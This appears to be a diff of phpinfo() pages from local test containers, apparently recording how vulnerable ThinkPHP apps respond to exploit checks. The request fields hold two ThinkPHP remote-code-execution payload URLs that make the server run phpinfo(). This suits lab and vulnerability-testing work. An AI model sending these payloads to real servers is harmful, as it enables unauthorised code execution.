+<a href="http://www.zend.com/"><img border="0" src="data:image/png;base64,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" alt="Zend logo" /></a>
+This program makes use of the Zend Scripting Language Engine:<br />Zend&nbsp;Engine&nbsp;v3.2.0,&nbsp;Copyright&nbsp;(c)&nbsp;1998-2018&nbsp;Zend&nbsp;Technologies<br /></td></tr>
+</table>
 <hr />
 <h1>Configuration</h1>
 <h2><a name="module_apache2handler">apache2handler</a></h2>
-<table border="0" cellpadding="3" width="600">
-<tr><td class="e">Apache Version </td><td class="v">Apache/2.4.10 (Debian) </td></tr>
+<table>
+<tr><td class="e">Apache Version </td><td class="v">Apache/2.4.38 (Debian) </td></tr>
 <tr><td class="e">Apache API Version </td><td class="v">20120211 </td></tr>
 <tr><td class="e">Server Administrator </td><td class="v">webmaster@localhost </td></tr>
-<tr><td class="e">Hostname:Port </td><td class="v">172.19.0.2:80 </td></tr>
+<tr><td class="e">Hostname:Port </td><td class="v">172.20.0.2:80 </td></tr>
 <tr><td class="e">User/Group </td><td class="v">www-data(33)/33 </td></tr>
 <tr><td class="e">Max Requests </td><td class="v">Per Child: 0 - Keep Alive: on - Max Per Connection: 100 </td></tr>
 <tr><td class="e">Timeouts </td><td class="v">Connection: 300 - Keep-Alive: 5 </td></tr>
 <tr><td class="e">Virtual Server </td><td class="v">Yes </td></tr>
 <tr><td class="e">Server Root </td><td class="v">/etc/apache2 </td></tr>
-<tr><td class="e">Loaded Modules </td><td class="v">core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php5 mod_setenvif mod_status </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+<tr><td class="e">Loaded Modules </td><td class="v">core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php7 mod_reqtimeout mod_setenvif mod_status </td></tr>
+</table>
+<table>
 <tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
 <tr><td class="e">engine</td><td class="v">1</td><td class="v">1</td></tr>
 <tr><td class="e">last_modified</td><td class="v">0</td><td class="v">0</td></tr>
 <tr><td class="e">xbithack</td><td class="v">0</td><td class="v">0</td></tr>
-</table><br />
+</table>
 <h2>Apache Environment</h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr class="h"><th>Variable</th><th>Value</th></tr>
 <tr><td class="e">HTTP_HOST </td><td class="v">localhost:8080 </td></tr>
 <tr><td class="e">HTTP_USER_AGENT </td><td class="v">python-requests/2.28.1 </td></tr>
@@ -89,64 +89,59 @@ This program makes use of the Zend Scripting Language Engine:<br />Zend&nbsp;Eng
 <tr><td class="e">HTTP_ACCEPT </td><td class="v">*/* </td></tr>
 <tr><td class="e">HTTP_CONNECTION </td><td class="v">keep-alive </td></tr>
 <tr><td class="e">PATH </td><td class="v">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin </td></tr>
-<tr><td class="e">SERVER_SIGNATURE </td><td class="v">&lt;address&gt;Apache/2.4.10 (Debian) Server at localhost Port 8080&lt;/address&gt;
+<tr><td class="e">SERVER_SIGNATURE </td><td class="v">&lt;address&gt;Apache/2.4.38 (Debian) Server at localhost Port 8080&lt;/address&gt;
  </td></tr>
-<tr><td class="e">SERVER_SOFTWARE </td><td class="v">Apache/2.4.10 (Debian) </td></tr>
+<tr><td class="e">SERVER_SOFTWARE </td><td class="v">Apache/2.4.38 (Debian) </td></tr>
 <tr><td class="e">SERVER_NAME </td><td class="v">localhost </td></tr>
-<tr><td class="e">SERVER_ADDR </td><td class="v">172.19.0.2 </td></tr>
+<tr><td class="e">SERVER_ADDR </td><td class="v">172.20.0.2 </td></tr>
 <tr><td class="e">SERVER_PORT </td><td class="v">8080 </td></tr>
-<tr><td class="e">REMOTE_ADDR </td><td class="v">172.19.0.1 </td></tr>
-<tr><td class="e">DOCUMENT_ROOT </td><td class="v">/var/www/html </td></tr>
+<tr><td class="e">REMOTE_ADDR </td><td class="v">172.20.0.1 </td></tr>
+<tr><td class="e">DOCUMENT_ROOT </td><td class="v">/var/www/public </td></tr>
 <tr><td class="e">REQUEST_SCHEME </td><td class="v">http </td></tr>
 <tr><td class="e">CONTEXT_PREFIX </td><td class="v"><i>no value</i> </td></tr>
-<tr><td class="e">CONTEXT_DOCUMENT_ROOT </td><td class="v">/var/www/html </td></tr>
+<tr><td class="e">CONTEXT_DOCUMENT_ROOT </td><td class="v">/var/www/public </td></tr>
 <tr><td class="e">SERVER_ADMIN </td><td class="v">webmaster@localhost </td></tr>
-<tr><td class="e">SCRIPT_FILENAME </td><td class="v">/var/www/html/index.php </td></tr>
-<tr><td class="e">REMOTE_PORT </td><td class="v">59220 </td></tr>
+<tr><td class="e">SCRIPT_FILENAME </td><td class="v">/var/www/public/index.php </td></tr>
+<tr><td class="e">REMOTE_PORT </td><td class="v">59328 </td></tr>
 <tr><td class="e">GATEWAY_INTERFACE </td><td class="v">CGI/1.1 </td></tr>
 <tr><td class="e">SERVER_PROTOCOL </td><td class="v">HTTP/1.1 </td></tr>
 <tr><td class="e">REQUEST_METHOD </td><td class="v">GET </td></tr>
-<tr><td class="e">QUERY_STRING </td><td class="v">s=/index/index/name/$%7B@phpinfo()%7D </td></tr>
-<tr><td class="e">REQUEST_URI </td><td class="v">/index.php?s=/index/index/name/$%7B@phpinfo()%7D </td></tr>
+<tr><td class="e">QUERY_STRING </td><td class="v">s=/Index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=-1 </td></tr>
+<tr><td class="e">REQUEST_URI </td><td class="v">/index.php?s=/Index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=-1 </td></tr>
 <tr><td class="e">SCRIPT_NAME </td><td class="v">/index.php </td></tr>
-</table><br />
+</table>
 <h2>HTTP Headers Information</h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr class="h"><th colspan="2">HTTP Request Headers</th></tr>
-<tr><td class="e">HTTP Request </td><td class="v">GET /index.php?s=/index/index/name/$%7B@phpinfo()%7D HTTP/1.1 </td></tr>
+<tr><td class="e">HTTP Request </td><td class="v">GET /index.php?s=/Index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=-1 HTTP/1.1 </td></tr>
 <tr><td class="e">Host </td><td class="v">localhost:8080 </td></tr>
 <tr><td class="e">User-Agent </td><td class="v">python-requests/2.28.1 </td></tr>
 <tr><td class="e">Accept-Encoding </td><td class="v">gzip, deflate, br </td></tr>
 <tr><td class="e">Accept </td><td class="v">*/* </td></tr>
 <tr><td class="e">Connection </td><td class="v">keep-alive </td></tr>
+<tr><td class="e">User_Agent </td><td class="v">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 </td></tr>
 <tr class="h"><th colspan="2">HTTP Response Headers</th></tr>
-<tr><td class="e">X-Powered-By </td><td class="v">PHP/5.5.38 </td></tr>
-<tr><td class="e">Set-Cookie </td><td class="v">PHPSESSID=5acc4fab09d5047ae8f46169039d5a2d; path=/ </td></tr>
-<tr><td class="e">Expires </td><td class="v">Thu, 19 Nov 1981 08:52:00 GMT </td></tr>
-<tr><td class="e">Cache-Control </td><td class="v">no-store, no-cache, must-revalidate, post-check=0, pre-check=0 </td></tr>
-<tr><td class="e">Pragma </td><td class="v">no-cache </td></tr>
-</table><br />
-<h2><a name="module_Core">Core</a></h2>
-<table border="0" cellpadding="3" width="600">
-<tr><td class="e">PHP Version </td><td class="v">5.5.38 </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+<tr><td class="e">X-Powered-By </td><td class="v">PHP/7.2.31 </td></tr>
+</table>
+<h2><a name="module_core">Core</a></h2>
+<table>
+<tr><td class="e">PHP Version </td><td class="v">7.2.31 </td></tr>
+</table>
+<table>
 <tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
 <tr><td class="e">allow_url_fopen</td><td class="v">On</td><td class="v">On</td></tr>
 <tr><td class="e">allow_url_include</td><td class="v">Off</td><td class="v">Off</td></tr>
-<tr><td class="e">always_populate_raw_post_data</td><td class="v">Off</td><td class="v">Off</td></tr>
 <tr><td class="e">arg_separator.input</td><td class="v">&amp;</td><td class="v">&amp;</td></tr>
 <tr><td class="e">arg_separator.output</td><td class="v">&amp;</td><td class="v">&amp;</td></tr>
-<tr><td class="e">asp_tags</td><td class="v">Off</td><td class="v">Off</td></tr>
 <tr><td class="e">auto_append_file</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">auto_globals_jit</td><td class="v">On</td><td class="v">On</td></tr>
 <tr><td class="e">auto_prepend_file</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">browscap</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
-<tr><td class="e">default_charset</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
+<tr><td class="e">default_charset</td><td class="v">UTF-8</td><td class="v">UTF-8</td></tr>
 <tr><td class="e">default_mimetype</td><td class="v">text/html</td><td class="v">text/html</td></tr>
 <tr><td class="e">disable_classes</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">disable_functions</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
-<tr><td class="e">display_errors</td><td class="v">On</td><td class="v">On</td></tr>
+<tr><td class="e">display_errors</td><td class="v">Off</td><td class="v">On</td></tr>
 <tr><td class="e">display_startup_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
 <tr><td class="e">doc_root</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">docref_ext</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
@@ -156,11 +151,11 @@ This program makes use of the Zend Scripting Language Engine:<br />Zend&nbsp;Eng
 <tr><td class="e">error_append_string</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">error_log</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">error_prepend_string</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
-<tr><td class="e">error_reporting</td><td class="v">0</td><td class="v"><i>no value</i></td></tr>
-<tr><td class="e">exit_on_timeout</td><td class="v">Off</td><td class="v">Off</td></tr>
+<tr><td class="e">error_reporting</td><td class="v">32767</td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">expose_php</td><td class="v">On</td><td class="v">On</td></tr>
-<tr><td class="e">extension_dir</td><td class="v">/usr/local/lib/php/extensions/no-debug-non-zts-20121212</td><td class="v">/usr/local/lib/php/extensions/no-debug-non-zts-20121212</td></tr>
+<tr><td class="e">extension_dir</td><td class="v">/usr/local/lib/php/extensions/no-debug-non-zts-20170718</td><td class="v">/usr/local/lib/php/extensions/no-debug-non-zts-20170718</td></tr>
 <tr><td class="e">file_uploads</td><td class="v">On</td><td class="v">On</td></tr>
+<tr><td class="e">hard_timeout</td><td class="v">2</td><td class="v">2</td></tr>
 <tr><td class="e">highlight.comment</td><td class="v"><font style="color: #FF8000">#FF8000</font></td><td class="v"><font style="color: #FF8000">#FF8000</font></td></tr>
 <tr><td class="e">highlight.default</td><td class="v"><font style="color: #0000BB">#0000BB</font></td><td class="v"><font style="color: #0000BB">#0000BB</font></td></tr>
 <tr><td class="e">highlight.html</td><td class="v"><font style="color: #000000">#000000</font></td><td class="v"><font style="color: #000000">#000000</font></td></tr>
@@ -171,7 +166,9 @@ This program makes use of the Zend Scripting Language Engine:<br />Zend&nbsp;Eng
 <tr><td class="e">ignore_repeated_source</td><td class="v">Off</td><td class="v">Off</td></tr>
 <tr><td class="e">ignore_user_abort</td><td class="v">Off</td><td class="v">Off</td></tr>
 <tr><td class="e">implicit_flush</td><td class="v">Off</td><td class="v">Off</td></tr>
-<tr><td class="e">include_path</td><td class="v">.:/usr/local/lib/php:ThinkPHP/Vendor/</td><td class="v">.:/usr/local/lib/php</td></tr>
+<tr><td class="e">include_path</td><td class="v">.:/usr/local/lib/php</td><td class="v">.:/usr/local/lib/php</td></tr>
+<tr><td class="e">input_encoding</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
+<tr><td class="e">internal_encoding</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">log_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
 <tr><td class="e">log_errors_max_len</td><td class="v">1024</td><td class="v">1024</td></tr>
 <tr><td class="e">mail.add_x_header</td><td class="v">Off</td><td class="v">Off</td></tr>
@@ -185,10 +182,11 @@ This program makes use of the Zend Scripting Language Engine:<br />Zend&nbsp;Eng
 <tr><td class="e">memory_limit</td><td class="v">128M</td><td class="v">128M</td></tr>
 <tr><td class="e">open_basedir</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">output_buffering</td><td class="v">0</td><td class="v">0</td></tr>
+<tr><td class="e">output_encoding</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">output_handler</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">post_max_size</td><td class="v">8M</td><td class="v">8M</td></tr>
 <tr><td class="e">precision</td><td class="v">14</td><td class="v">14</td></tr>
-<tr><td class="e">realpath_cache_size</td><td class="v">16K</td><td class="v">16K</td></tr>
+<tr><td class="e">realpath_cache_size</td><td class="v">4096K</td><td class="v">4096K</td></tr>
 <tr><td class="e">realpath_cache_ttl</td><td class="v">120</td><td class="v">120</td></tr>
 <tr><td class="e">register_argc_argv</td><td class="v">On</td><td class="v">On</td></tr>
 <tr><td class="e">report_memleaks</td><td class="v">On</td><td class="v">On</td></tr>
@@ -196,11 +194,10 @@ This program makes use of the Zend Scripting Language Engine:<br />Zend&nbsp;Eng
 <tr><td class="e">request_order</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">sendmail_from</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">sendmail_path</td><td class="v">&nbsp;-t&nbsp;-i&nbsp;</td><td class="v">&nbsp;-t&nbsp;-i&nbsp;</td></tr>
-<tr><td class="e">serialize_precision</td><td class="v">17</td><td class="v">17</td></tr>
+<tr><td class="e">serialize_precision</td><td class="v">-1</td><td class="v">-1</td></tr>
 <tr><td class="e">short_open_tag</td><td class="v">On</td><td class="v">On</td></tr>
 <tr><td class="e">SMTP</td><td class="v">localhost</td><td class="v">localhost</td></tr>
 <tr><td class="e">smtp_port</td><td class="v">25</td><td class="v">25</td></tr>
-<tr><td class="e">sql.safe_mode</td><td class="v">Off</td><td class="v">Off</td></tr>
 <tr><td class="e">sys_temp_dir</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">track_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
 <tr><td class="e">unserialize_callback_func</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
@@ -212,20 +209,22 @@ This program makes use of the Zend Scripting Language Engine:<br />Zend&nbsp;Eng
 <tr><td class="e">variables_order</td><td class="v">EGPCS</td><td class="v">EGPCS</td></tr>
 <tr><td class="e">xmlrpc_error_number</td><td class="v">0</td><td class="v">0</td></tr>
 <tr><td class="e">xmlrpc_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
+<tr><td class="e">zend.assertions</td><td class="v">1</td><td class="v">1</td></tr>
 <tr><td class="e">zend.detect_unicode</td><td class="v">On</td><td class="v">On</td></tr>
 <tr><td class="e">zend.enable_gc</td><td class="v">On</td><td class="v">On</td></tr>
 <tr><td class="e">zend.multibyte</td><td class="v">Off</td><td class="v">Off</td></tr>
 <tr><td class="e">zend.script_encoding</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
-</table><br />
+<tr><td class="e">zend.signal_check</td><td class="v">Off</td><td class="v">Off</td></tr>
+</table>
 <h2><a name="module_ctype">ctype</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">ctype functions </td><td class="v">enabled </td></tr>
-</table><br />
+</table>
 <h2><a name="module_curl">curl</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">cURL support </td><td class="v">enabled </td></tr>
-<tr><td class="e">cURL Information </td><td class="v">7.38.0 </td></tr>
-<tr><td class="e">Age </td><td class="v">3 </td></tr>
+<tr><td class="e">cURL Information </td><td class="v">7.64.0 </td></tr>
+<tr><td class="e">Age </td><td class="v">4 </td></tr>
 <tr><td class="e">Features </td></tr>
 <tr><td class="e">AsynchDNS </td><td class="v">Yes </td></tr>
 <tr><td class="e">CharConv </td><td class="v">No </td></tr>
@@ -242,135 +241,144 @@ This program makes use of the Zend Scripting Language Engine:<br />Zend&nbsp;Eng
 <tr><td class="e">SSL </td><td class="v">Yes </td></tr>
 <tr><td class="e">SSPI </td><td class="v">No </td></tr>
 <tr><td class="e">TLS-SRP </td><td class="v">Yes </td></tr>
-<tr><td class="e">Protocols </td><td class="v">dict, file, ftp, ftps, gopher, http, https, imap, imaps, ldap, ldaps, pop3, pop3s, rtmp, rtsp, scp, sftp, smtp, smtps, telnet, tftp </td></tr>
+<tr><td class="e">HTTP2 </td><td class="v">Yes </td></tr>
+<tr><td class="e">GSSAPI </td><td class="v">Yes </td></tr>
+<tr><td class="e">KERBEROS5 </td><td class="v">Yes </td></tr>
+<tr><td class="e">UNIX_SOCKETS </td><td class="v">Yes </td></tr>
+<tr><td class="e">PSL </td><td class="v">Yes </td></tr>
